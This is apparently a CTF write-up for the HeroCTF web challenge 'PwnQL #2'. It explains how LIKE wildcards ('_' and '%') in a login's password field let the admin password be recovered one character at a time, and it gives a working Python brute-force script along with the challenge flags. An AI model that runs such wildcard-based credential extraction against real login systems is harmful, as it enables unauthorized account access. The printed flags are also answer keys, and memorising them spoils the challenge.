# PwnQL #2
### Category : Web
### Description : Extract the admin's password from the database.
### URL : http://chall1.heroctf.fr:8080
### Solution

We get the same link as PwnQL#1, We need to get the password but we cannot use any sql injection since the single quotes are escaped. So we can guess the password by guessing the individual characters.
To get the length we can send '\_' for each character and guess the password, ( the password length is 10 ). 

I wrote the following script to get the password
```
import requests
import string

# flag of first challenge -> Hero{pwnQL_b4sic_0ne_129835}

url = "http://chall1.heroctf.fr:8080/index.php"
chars = string.printable

# Each '_' is a placeholder for a single character
flag = ''
data = {"username":"admin", "password": '' }

print("[+]Getting the password")

for i in range(10):
    for char in chars:
        print("\rTrying " + str(char) + " at " + str(i), end="")
        temp = flag
        if char not in string.whitespace and char != '%' :
            temp += char
            data["password"] = str(temp) + "%"
            # print(data)
            res = requests.post(url ,data=data)
            if "pwnQL_b4sic_0ne_129835" in res.text:
                flag = flag + char
                print("\nFound " + str(char) + " at " + str(i))
                break
print(flag)                                                                                                            
```

###Flag : Hero{s3cur3p@ss}

